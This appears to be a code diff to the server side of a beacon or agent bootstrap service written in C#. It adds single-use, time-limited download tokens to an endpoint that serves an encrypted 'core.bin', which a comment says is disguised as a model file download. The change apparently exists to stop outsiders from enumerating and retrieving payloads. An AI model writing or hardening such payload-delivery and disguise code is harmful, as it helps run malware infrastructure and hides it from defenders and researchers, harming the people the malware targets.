@@ -28,6 +28,7 @@ public class V1BootstrapController : ControllerBase
     private readonly ServerKeyService _serverKeys;
     private readonly BeaconSettings _beaconSettings;
     private readonly AgentService _agentService;
+    private readonly DownloadTicketStore _tickets;
     private readonly IWebHostEnvironment _env;
 
     public V1BootstrapController(
@@ -35,12 +36,14 @@ public class V1BootstrapController : ControllerBase
         ServerKeyService serverKeys,
         IOptions<BeaconSettings> beaconSettings,
         AgentService agentService,
+        DownloadTicketStore tickets,
         IWebHostEnvironment env)
     {
         _commsService = commsService;
         _serverKeys = serverKeys;
         _beaconSettings = beaconSettings.Value;
         _agentService = agentService;
+        _tickets = tickets;
         _env = env;
     }
 
@@ -156,7 +159,13 @@ public class V1BootstrapController : ControllerBase
         {
             var aesKey = System.IO.File.ReadAllBytes(keyPath);
             var encrypted = CryptoHelper.RsaEncrypt(aesKey, request.PublicKey);
-            return Ok(new { encryptedKey = Convert.ToBase64String(encrypted) });
+            // 发放一次性下载凭证（core.bin 防枚举）：5 分钟有效、绑定 buildId
+            var ticket = _tickets.Issue(request.BuildId);
+            return Ok(new
+            {
+                encryptedKey = Convert.ToBase64String(encrypted),
+                downloadToken = ticket,
+            });
         }
         catch
         {
@@ -164,12 +173,16 @@ public class V1BootstrapController : ControllerBase
         }
     }
 
-    /// <summary>下载加密 core.bin（伪装成模型文件下载）。</summary>
+    /// <summary>下载加密 core.bin（伪装成模型文件下载）。需一次性下载凭证 t=…。</summary>
     [HttpGet("models/{buildId}")]
-    public IActionResult Models(string buildId)
+    public IActionResult Models(string buildId, [FromQuery] string? t)
     {
         if (string.IsNullOrWhiteSpace(buildId) || buildId.Any(c => !char.IsAsciiLetterOrDigit(c)))
             return BadRequest(new { error = "invalid build id" });
+
+        // 防枚举：无有效凭证一律拒绝（凭证一次性、5 分钟有效、绑定 buildId）
+        if (!_tickets.Consume(buildId, t ?? ""))
+            return Unauthorized(new { error = "invalid or expired download token" });
 
         var corePath = Path.Combine(BuildsDir, buildId, "core.bin");
         if (!System.IO.File.Exists(corePath))
